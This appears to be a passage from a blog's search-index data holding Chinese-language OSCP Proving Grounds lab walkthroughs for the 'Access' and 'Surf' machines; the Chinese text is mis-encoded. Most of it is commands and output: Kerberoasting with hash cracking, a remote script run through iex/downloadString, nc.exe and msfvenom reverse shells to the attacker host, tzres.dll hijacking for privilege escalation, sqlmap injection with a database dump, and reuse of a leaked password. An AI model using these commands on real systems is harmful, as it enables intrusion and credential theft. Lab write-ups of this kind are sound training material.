Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"PrivE ä¸Šä¼ å·¥å…· PS C:\\tmp\u003e curl http://192.168.45.169/winPEASany.exe -o C:\\tmp\\winPEASany.exe PS C:\\tmp\u003e dir PS C:\\tmp\u003e ./winPEASany.exe \u003e 1.txt ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"SPN åœ¨å½“å‰ç”¨æˆ·ä¸‹æ²¡æœ‰local.txtæ–‡ä»¶ï¼Œæ³¨æ„åˆ°è¿˜æœ‰å¦ä¸€ä¸ªsvc_mssqlè´¦æˆ· PS C:\\tmp\u003e dir C:\\users\\ Directory: C:\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/28/2021 3:53 AM Administrator d-r--- 5/28/2021 3:53 AM Public d----- 4/8/2022 2:39 AM svc_apache d----- 4/8/2022 2:40 AM svc_mssql æœé›†SPNï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°kaliè‡ªå¸¦çš„empireä¸‹çš„get-spn.ps1æ— æ³•å®ç°æ•ˆæœï¼Œäºæ˜¯ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªè„šæœ¬ï¼Œåœ°å€ï¼šhttps://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1 # Source / credit: # https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx cls $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\"\") $search.filter = \"(servicePrincipalName=*)\" ## You can use this to filter for OU's: ## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' } $results = $search.Findall() foreach( $result in $results ) { $userEntry = $result.GetDirectoryEntry() Write-host \"Object Name = \" $userEntry.name -backgroundcolor \"yellow\" -foregroundcolor \"black\" Write-host \"DN = \" $userEntry.distinguishedName Write-host \"Object Cat. = \" $userEntry.objectCategory Write-host \"servicePrincipalNames\" $i=1 foreach( $SPN in $userEntry.servicePrincipalName ) { Write-host \"SPN(\" $i \") = \" $SPN $i+=1 } Write-host \"\" } svc_mssqlçš„SPNä¸º MSSQLSvc/DC.access.offsec PS C:\\tmp\u003e iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1 iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1 PS C:\\tmp\u003e ./Get-SPN.ps1 ./Get-SPN.ps1 Object Name = SERVER DN = CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec Object Cat. = CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec SPN( 2 ) = ldap/SERVER.access.offsec/ForestDnsZones.access.offsec SPN( 3 ) = ldap/SERVER.access.offsec/DomainDnsZones.access.offsec SPN( 4 ) = DNS/SERVER.access.offsec SPN( 5 ) = GC/SERVER.access.offsec/access.offsec SPN( 6 ) = RestrictedKrbHost/SERVER.access.offsec SPN( 7 ) = RestrictedKrbHost/SERVER SPN( 8 ) = RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec SPN( 9 ) = HOST/SERVER/ACCESS SPN( 10 ) = HOST/SERVER.access.offsec/ACCESS SPN( 11 ) = HOST/SERVER SPN( 12 ) = HOST/SERVER.access.offsec SPN( 13 ) = HOST/SERVER.access.offsec/access.offsec SPN( 14 ) = E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec SPN( 15 ) = ldap/SERVER/ACCESS SPN( 16 ) = ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec SPN( 17 ) = ldap/SERVER.access.offsec/ACCESS SPN( 18 ) = ldap/SERVER SPN( 19 ) = ldap/SERVER.access.offsec SPN( 20 ) = ldap/SERVER.access.offsec/access.offsec Object Name = krbtgt DN = CN=krbtgt,CN=Users,DC=access,DC=offsec Object Cat. = CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = kadmin/changepw Object Name = MSSQL DN = CN=MSSQL,CN=Users,DC=access,DC=offsec Object Cat. = CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec servicePrincipalNames SPN( 1 ) = MSSQLSvc/DC.access.offsec PS C:\\tmp\u003e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"Ticket æ¥ä¸‹å»è·å–svc_mssqlçš„ç¥¨æ®ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°†ticketå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼š PS C:\\tmp\u003e Add-Type -AssemblyName System.IdentityModel Add-Type -AssemblyName System.IdentityModel PS C:\\tmp\u003e New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec' New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec' Id : uuid-b4d9ac78-ba0f-45f4-8020-5dec3d5e6101-1 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey} ValidFrom : 1/11/2024 5:44:07 PM ValidTo : 1/12/2024 3:44:07 AM ServicePrincipalName : MSSQLSvc/DC.access.offsec SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey åˆ©ç”¨Empire çš„ Invoke-Kerberoast.ps1 å¯¼å‡ºå†…å­˜ä¸­çš„Kerberoast hash PS C:\\tmp\u003e iex(new-object net.webclient).downloadString('http://192.168.45.169/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat TicketByteHexStream : Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$600077ADCF96E989D8C9A8D1AE325F08 $A0DA4C8A4C76EB098A4567BBCA91C9883EAA1F35C75428CEE9F738D9044A5F0F41153B51832DA55E14097C267EA14BF 88A9861E14500A2E1E3D8E95269FD34FEA33A40EFF9658E40C8DADFDD868D17A49BDCD72575BBF060267B0F4F7617BFF 028165312F9D575F2189828715749CABD5AD9308D4BE166A4B3B3736ECFEC98367F0E43E93DE1E498F86AF3E8AB9B446 3448467DCBD60E25B8051656976F5D1B9DFCB02D3FABC7B1578FEC8570B4D606E6EADCC8A0BA80C9F2C1F2B395F46A2E 98008B02B42DABEF1800C3264B7BE558FFFF96FDC93D9133166124308C0CD7548827E217821ED41C05C1904665C711F9 E21C964A98A94D2568EF863542259C31B36457D146B93FAA8B682E48C49B1281C54D56051406869FE8683DF28D38A5BD 48503640ABBEB4AF5DDDA28046377D80D8A018D38E50EC925FD845838EFA60D34AA29E4BC1A1B0B54A8929546C9DC642 866C34ED547590237A04DE24E76D774467A7F42836C5ED87D9A50E0C7C225B7F107F16135CE4063507BC8B9DA72AD454 92FBFC6E37B946A0D66D109D4C41923D174B63F3AB9C41B2F8DFD814B0B01C9178B48C0C851FD623E8FEAB6FCC83BCF7 358C87BF4D3CAABF382DFB4E660116DA8604CFD0C83847064DF06CF15479583E7D108552E5E914DD6DBB12CA6AE6561B 85F54A84ECBD92CA3C64EA8D27D80904E5FB0554B7FC04A3C49A237BB12D7D22D5384C1A7A7F81E1C8CC22A9C9C860F4 F66D4F469FDD8D02752E547A604627EA2C1CE1110D7F4B5BA374DF19E5CD003F7F9ACEBCD65346276503E304D98E952A 2ACE9586F012BDAB4DAB26A176A93B0F82CA65A7D39175DC2A9F14BD8B6B9079AE1324E0A64CF24539A616012773C0E3 214C62366F1F4FE67508262DD9402DB08A93B8485C3E61E843788517AD4B70A937667585493540EE55837097DA324686 EA8AE61DAA9F6B4CB4AA98D2E870DEFEB33DD2BFBE0C7758E57EB3C10F08B67484339CB877C327B63A1D37E5FDFD9478 35BCBB3B24A742C64CF98316B20C14973A8A32C61A739E7B0C40D59777C2BE502E79AC51571E9A1E3A8F9AC8BB8B024D 742106656D1F4CBA5D5C7DB50D2EFA204A50ABC665F6BB86B1DC18F9A8C3E4F7413BFCB2B504F6C353709CE120885AD6 2A7A11F22D2F4B95A7B2D8ADE89F25A344CE6E85B4A1E33072D43A7838A25DCBFFC7110E559C15D54C39BC4BD287387A C4099BF18D926CD464F9A4F2927DA5944360A8ECB1CC5998AF1017554E58CCE2E1BEDBD4A0BC4DEAEB97F914BA05B184 D522ACA5FA8FEF3F5DAC9D71C1E0C7A8E72AD7D98C114C156A05D695AC5CDBEFAD407BB65FBFE8955E58C4DE0519EBBA 102F46241BD2C3EE053FF2E5D78493CDF75CC113CF3FC3A72E0B22F24D9845385A8613C5E30DA408D7095806607EBD04 797BF7FE35EB5AF096B0A144D92B103C9FB30F150C2EEFAC49737DEBF38B781822E39409BCFF12657F2E1CFDB0DA7168 EFA2DD9CB42D6694C4FF65AEC36E529E4DD06E66384E7AEF3AF37A9F45DC9DCC99C57F5E94A36661517037FBC81FEF72 81940B899A369EC5EC91804161EDA0B3E4BA39E7957A85027DB3825FA0AA490B74514 SamAccountName : svc_mssql DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec ServicePrincipalName : MSSQLSvc/DC.access.offsec ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"Crack Hash æ•´ç†hashæ ¼å¼å†™å…¥æ–‡ä»¶ ä½¿ç”¨hashcatè¿›è¡Œç ´è§£ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt --force -a 0 --show $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$600077adcf96e989d8c9a8d1ae325f08$a0da4c8a4c76eb098a4567bbca91c9883eaa1f35c75428cee9f738d9044a5f0f41153b51832da55e14097c267ea14bf88a9861e14500a2e1e3d8e95269fd34fea33a40eff9658e40c8dadfdd868d17a49bdcd72575bbf060267b0f4f7617bff028165312f9d575f2189828715749cabd5ad9308d4be166a4b3b3736ecfec98367f0e43e93de1e498f86af3e8ab9b4463448467dcbd60e25b8051656976f5d1b9dfcb02d3fabc7b1578fec8570b4d606e6eadcc8a0ba80c9f2c1f2b395f46a2e98008b02b42dabef1800c3264b7be558ffff96fdc93d9133166124308c0cd7548827e217821ed41c05c1904665c711f9e21c964a98a94d2568ef863542259c31b36457d146b93faa8b682e48c49b1281c54d56051406869fe8683df28d38a5bd48503640abbeb4af5ddda28046377d80d8a018d38e50ec925fd845838efa60d34aa29e4bc1a1b0b54a8929546c9dc642866c34ed547590237a04de24e76d774467a7f42836c5ed87d9a50e0c7c225b7f107f16135ce4063507bc8b9da72ad45492fbfc6e37b946a0d66d109d4c41923d174b63f3ab9c41b2f8dfd814b0b01c9178b48c0c851fd623e8feab6fcc83bcf7358c87bf4d3caabf382dfb4e660116da8604cfd0c83847064df06cf15479583e7d108552e5e914dd6dbb12ca6ae6561b85f54a84ecbd92ca3c64ea8d27d80904e5fb0554b7fc04a3c49a237bb12d7d22d5384c1a7a7f81e1c8cc22a9c9c860f4f66d4f469fdd8d02752e547a604627ea2c1ce1110d7f4b5ba374df19e5cd003f7f9acebcd65346276503e304d98e952a2ace9586f012bdab4dab26a176a93b0f82ca65a7d39175dc2a9f14bd8b6b9079ae1324e0a64cf24539a616012773c0e3214c62366f1f4fe67508262dd9402db08a93b8485c3e61e843788517ad4b70a937667585493540ee55837097da324686ea8ae61daa9f6b4cb4aa98d2e870defeb33dd2bfbe0c7758e57eb3c10f08b67484339cb877c327b63a1d37e5fdfd947835bcbb3b24a742c64cf98316b20c14973a8a32c61a739e7b0c40d59777c2be502e79ac51571e9a1e3a8f9ac8bb8b024d742106656d1f4cba5d5c7db50d2efa204a50abc665f6bb86b1dc18f9a8c3e4f7413bfcb2b504f6c353709ce120885ad62a7a11f22d2f4b95a7b2d8ade89f25a344ce6e85b4a1e33072d43a7838a25dcbffc7110e559c15d54c39bc4bd287387ac4099bf18d926cd464f9a4f2927da5944360a8ecb1cc5998af1017554e58cce2e1bedbd4a0bc4deaeb97f914ba05b184d522aca5fa8fef3f5dac9d71c1e0c7a8e72ad7d98c114c156a05d695ac5cdbefad407bb65fbfe8955e58c4de0519ebba102f46241bd2c3ee053ff2e5d78493cdf75cc113cf3fc3a72e0b22f24d9845385a8613c5e30da408d7095806607ebd04797bf7fe35eb5af096b0a144d92b103c9fb30f150c2eefac49737debf38b781822e39409bcff12657f2e1cfdb0da7168efa2dd9cb42d6694c4ff65aec36e529e4dd06e66384e7aef3af37a9f45dc9dcc99c57f5e94a36661517037fbc81fef7281940b899a369ec5ec91804161eda0b3e4ba39e7957a85027db3825fa0aa490b74514:trustno1 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"RunasCs æ¥ä¸‹å»éœ€è¦è·å–mssqlèº«ä»½çš„åå¼¹shellï¼Œå¯ä»¥ä½¿ç”¨\"Invoke-RunasCs.ps1â€œè¿™ä¸ªè„šæœ¬ PS C:\\tmp\u003e curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1 curl https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1 PS C:\\tmp\u003e ls Directory: C:\\tmp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/11/2024 8:50 AM 498700 1.txt -a---- 1/11/2024 9:06 AM 0 2.txt -a---- 1/11/2024 9:38 AM 883 Get-SPN.ps1 -a---- 1/11/2024 9:46 AM 46818 Invoke-Kerberoast.ps1 -a---- 1/11/2024 10:09 AM 88284 Invoke-RunasCs.ps1 -a---- 1/11/2024 8:45 AM 43696 nc.exe -a---- 1/11/2024 8:49 AM 2029568 winPEASany.exe PS C:\\tmp\u003e import-module ./Invoke-RunasCs.ps1 import-module ./Invoke-RunasCs.ps1 PS C:\\tmp\u003e Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\" Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\" [*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. access\\svc_mssql PS C:\\tmp\u003e Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"C:\\tmp\\nc.exe 192.168.45.169 7777 -e powershell\" Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"C:\\tmp\\nc.exe 192.168.45.169 7777 -e powershell\" [*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token. PS C:\\Windows\\system32\u003e cd C:\\users\\svc_mssql\\Desktop\\ cd C:\\users\\svc_mssql\\Desktop\\ PS C:\\users\\svc_mssql\\Desktop\u003e cat local.txt cat local.txt ac7cd92298a3ec65de98ea4c51f9e95e ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:4:4","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"PrivE å†æ¬¡è¿›è¡Œä¿¡æ¯æœé›† å‘ç°å½“å‰ç”¨æˆ·æƒé™å¦‚ä¸‹ï¼š PS C:\\tmp\u003e whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================ ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled å…¶ä¸­SeManageVolumePrivilegeæƒé™å¯è¢«ç”¨äºææƒï¼Œç›¸å…³é“¾æ¥ï¼šhttps://github.com/xct/SeManageVolumeAbuse éœ€è¦ç”¨vs stuidoæ‰‹åŠ¨ç¼–è¯‘ä¸€ä¸‹ PS C:\\tmp\u003e curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe curl http://192.168.45.169/SeManageVolumeAbuse.exe -o SeManageVolumeAbuse.exe PS C:\\tmp\u003e ./SeManageVolumeAbuse.exe ./SeManageVolumeAbuse.exe Success! Permissions changed. PS C:\\tmp\u003e icacls C:/windows icacls C:/windows C:/windows NT SERVICE\\TrustedInstaller:(F) NT SERVICE\\TrustedInstaller:(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(M) NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F) BUILTIN\\Users:(M) BUILTIN\\Users:(OI)(CI)(IO)(F) BUILTIN\\Users:(RX) BUILTIN\\Users:(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) Successfully processed 1 files; Failed processing 0 files PS C:\\tmp\u003e æ¥ä¸‹å»è¦ä¸Šä¼  tzres.dllåˆ° C:\\Windows\\System32\\wbem\\tzres.dllï¼Œå†é€šè¿‡systeminfoå‘½ä»¤å»è§¦å‘å®ƒ ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ª64ä½åå¼¹shellçš„dllæ–‡ä»¶ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4444 -f dll -o tzres.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 9216 bytes Saved as: tzres.dll PS C:\\tmp\u003e curl http://192.168.45.169/tzres.dll -o tzres.dll curl http://192.168.45.169/tzres.dll -o tzres.dll PS C:\\tmp\u003e cp tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll cp tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll PS C:\\tmp\u003e systeminfo \u003e 5.txt systeminfo \u003e 5.txt systeminfo : ERROR: The remote procedure call failed. At line:1 char:1 + systeminfo \u003e 5.txt + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (ERROR: The remote procedure call failed.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError PS C:\\tmp\u003e æ”¶åˆ°åå¼¹shellï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Access] â””â”€$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.169] from (UNKNOWN) [192.168.167.187] 50960 Microsoft Windows [Version 10.0.17763.2746] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\network service C:\\Windows\\system32\u003ecd C:\\users\\administrator\\desktop\\ cd C:\\users\\administrator\\desktop\\ C:\\Users\\Administrator\\Desktop\u003etype proof.txt type proof.txt d0be636ebf08cd4c91a276012f25a135 ","date":"2024-01-12","objectID":"/posts/provinggrounds-access/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Access Writeup","uri":"/posts/provinggrounds-access/"},{"categories":["é¶åœº"],"content":"ç«¯å£æ‰«æï¼š æ•´ç† â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ sudo nmap -n -r --min-rate=3500 -p- -sSV --script default,vuln 192.168.162.171 -oN surf-all.txt [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-03 14:59 CST Nmap scan report for 192.168.162.171 Host is up (0.22s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | vulners: CVEs | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) |_ 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Surfing blog | vulners: | cpe:/a:apache:http_server:2.4.38: CVEs | http-enum: | /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)' |_ /js/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)' Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.76 seconds ","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["é¶åœº"],"content":"Webæ‰«æ è®¿é—® 80ç«¯å£WebæœåŠ¡ï¼Œæ˜¯ä¸ªåšå®¢ï¼Œæ–‡ç« ä½œè€…æ˜¯Adminã€‚ Webæ‰«æ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ dirsearch -x 400,404 -t 500 -e php,asp,aspx,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.162.171 å‘ç°ç®¡ç†åå°ç™»å½•å£ï¼šhttp://192.168.162.171/administration/login.php å°è¯•æš´ç ´ï¼Œå¤±è´¥ ç™»å½•å¤±è´¥çš„è¿”å›åŒ…ä¸­æœ‰è¿™ä¸ªå¤´Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3Dï¼Œbase64æ¥ç åä¸º{'success':'false'} æŠ“åŒ…æ”¹åŒ…ï¼Œæ‰‹åŠ¨ä¿®æ”¹ä¸ºtrueåè¿›å…¥åå°ï¼Œç»•è¿‡å‰ç«¯é™åˆ¶ã€‚ å‘ç°æœ‰ä¸ªé¡µé¢ï¼Œæµ‹è¯•å‘ç°å­˜åœ¨order byç‚¹ä½çš„æ³¨å…¥ http://192.168.162.171/administration/customers.php?search_string=c\u0026filter_col=if((substr(version(),1,1)='8'),id,phone)\u0026order_by=asc æµ‹è¯•å‘ç°åç«¯SQLè¯­å¥ä¸ºï¼š SELECT SQL_CALC_FOUND_ROWS id, f_name, l_name, gender, phone, created_at, updated_at FROM customers WHERE f_name like ? OR l_name like ? ORDER BY id ASC LIMIT 0, 15 å› ä¸ºä¸æ˜¯è€ƒè¯•ï¼Œæƒ³å·æ‡’ï¼Œäºæ˜¯ç”¨ä¸Šäº†sqlmap â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ sqlmap -r sqli.txt --banner --level=3 --risk=3 -p 'filter_col' --batch â€¦â€¦ GET parameter 'filter_col' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 516 HTTP(s) requests: --- Parameter: filter_col (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment) Payload: search_string=c\u0026filter_col=id AND 7911=(SELECT (CASE WHEN (7911=7911) THEN 7911 ELSE (SELECT 6771 UNION SELECT 4630) END))-- -\u0026order_by=asc Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: search_string=c\u0026filter_col=id AND (SELECT 9022 FROM (SELECT(SLEEP(5)))HmQp)\u0026order_by=asc --- [16:36:30] [INFO] the back-end DBMS is MySQL [16:36:30] [INFO] fetching banner [16:36:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [16:36:30] [INFO] retrieved: 10.3.31-MariaDB-0+deb10u1 web server operating system: Linux Debian 10 (buster) web application technology: Apache 2.4.38 back-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork) banner: '10.3.31-MariaDB-0+deb10u1' [16:37:10] [INFO] fetched data logged to text files under '/home/xavier/.local/share/sqlmap/output/192.168.162.171' [*] ending @ 16:37:10 /2023-12-03/ # å†™shellå¤±è´¥ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --os-shell # è·å–æ•°æ® â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ sqlmap -r sqli.txt --level=3 --risk=3 -p 'filter_col' --batch --dump â€¦â€¦ Database: corephpadmin Table: admin_accounts [1 entry] +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ | id | series_id | expires | password | user_name | admin_type | remember_token | +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ | 11 | NULL | NULL | $2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm | james | super | NULL | +----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+ â€¦â€¦ æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç å“ˆå¸Œ å°è¯•è§£å¯† â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ hashid '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' Analyzing '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ echo '$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm' \u003e james.hash â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ hashcat -h | grep -i bcrypt 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ hashcat -m 3200 james.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-3000","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["é¶åœº"],"content":"æƒé™æå‡ linpeasä¿¡æ¯æœé›† â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files $locale['853'] = \"Admin Password:\"; define('DB_PASSWORD', \"FlyToTheMoon213!\"); define('DB_USER', \"core\"); æ‹¿åˆ°å¯†ç ï¼Œè¯•å‡ºæ¥æ˜¯jamesçš„ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ sshpass -p 'FlyToTheMoon213!' ssh james@192.168.162.171 Linux Surf 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. $ id uid=1000(james) gid=1000(james) groups=1000(james) $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; james@Surf:~$ ls local.txt james@Surf:~$ cat local.txt a4e66109b23dd0df9165c992668efe14 james@Surf:~$ æŸ¥çœ‹sudoæƒé™ james@Surf:~$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for james: Matching Defaults entries for james on Surf: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User james may run the following commands on Surf: (ALL) /usr/bin/php /var/backups/database-backup.php james@Surf:~$ ls -al /var/backups/database-backup.php -rwxr-xr-x 1 www-data www-data 2758 Nov 9 2021 /var/backups/database-backup.php james@Surf:~$ æœ‰æ€è·¯äº†ï¼Œä¿®æ”¹PHPæ–‡ä»¶ï¼Œsudoæ‰§è¡Œåå¼¹shell åˆ‡æ¢2ä¸ªç”¨æˆ·å¤ªéº»çƒ¦äº†ï¼Œä¸»è¦æ˜¯ncçš„shellä¸æ–¹ä¾¿ä¿®æ”¹æ–‡ä»¶ï¼Œå¹²è„†ç›´æ¥ä¿®æ”¹æƒé™ä¸º777 www-data@Surf:/var/backups$ chmod 777 database-backup.php www-data@Surf:/var/backups$ ls -l database-backup.php -rwxrwxrwx 1 www-data www-data 2829 Dec 3 06:07 database-backup.php 